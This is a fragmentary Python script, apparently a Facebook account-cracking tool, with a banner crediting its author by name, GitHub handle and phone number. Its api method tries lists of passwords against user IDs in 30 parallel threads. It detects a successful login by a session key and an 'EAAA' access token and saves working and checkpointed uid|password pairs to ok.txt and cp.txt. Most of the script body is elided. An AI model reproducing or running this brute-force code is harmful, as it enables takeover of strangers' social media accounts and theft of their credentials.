...
╚═╝░░╚═╝╚═╝╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░                                                                                                                                                                      
  ...
  \033[1;91;1m█ \033[1;37m [•] \033[1;31;1mTOOLS OWNER     \033[1;37m [•]  \033[1;32m║║ \033[1;37m [•] \033[1;31;1m RIFAT SORKER \033[1;37m  [•]  \033[1;31m█ 

  \033[1;31;1m█ \033[1;37m [•] \033[1;32;1mFACEBOOK PAGE   \033[1;37m [•]\033[1;32m  ║║ \033[1;37m [•] \033[1;32m  RIFAT     \033[1;37m[•]  \033[1;31m█ 

  \033[1;31;1m█ \033[1;37m [•] \033[1;33;1mGITHUB USER     \033[1;37m [•]\033[1;32m  ║║ \033[1;37m [•] \033[1;33m  RIFAT-35     \033[1;37m[•]  \033[1;31m█ 

  \033[1;31;1m█ \033[1;37m [•] \033[1;34;1mWHATS APP NUMBER\033[1;37m [•]  \033[1;32m║║ \033[1;37m [•] \033[1;34m+8801890384480 \033[1;37m[•]  \033[1;31m█ 
...
class timer:
    ...
    def psy(self):
        ...
        try:
            ...
            with ThreadPoolExecutor(max_workers=30) as coeg:
                ...
                print("\n%s [+] OK RESULTS SAVED IN -> RIFAT-ok.txt" % (G))

                print("%s [+] CP RESULTS SAVED IN -> RIFAT-cp.txt" % (Y))
    ...
    def old4_7(self):
        ...
        try:
            ...
            with ThreadPoolExecutor(max_workers=30) as coeg:
                ...
                print("%s [+] CP RESULTS SAVED IN -> RIFAT-cp.txt" % (R))
    ...
    def old_13(self):
        ...
        try:
            ...
            with ThreadPoolExecutor(max_workers=30) as coeg:
                ...
                print("\n%s [+] OK RESULTS SAVED IN -> RIFAT-CP.txt" % (G))
    ...
    def email(self):
        ...
        try:
            ...
            with ThreadPoolExecutor(max_workers=30) as coeg:
                ...
                print("%s [+] CP RESULT SAVED IN -> RIFAT-cp.txt" % (Y))
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write("\r\r %s[A-U-H]  %s/%s   \033[0;92m[OK:-%s]    \033[0;91m[CP:-%s]" % (
        ...
        for pw in pwx:
            ...
            if "session_key" in response.text and "EAAA" in response.text:
                ...
                open("ok.txt", "a").write(" [RIFAT-OK] %s|%s\n" % (uid, pw))
                ...
                print("\r \033[0;91m[RIFAT-CP] %s|%s\033[0;97m         " % (uid, pw))

                self.cp.append("%s|%s" % (uid, pw))

                open("cp.txt", "a").write(" [RIFAT-CP] %s|%s\n" % (uid, pw))
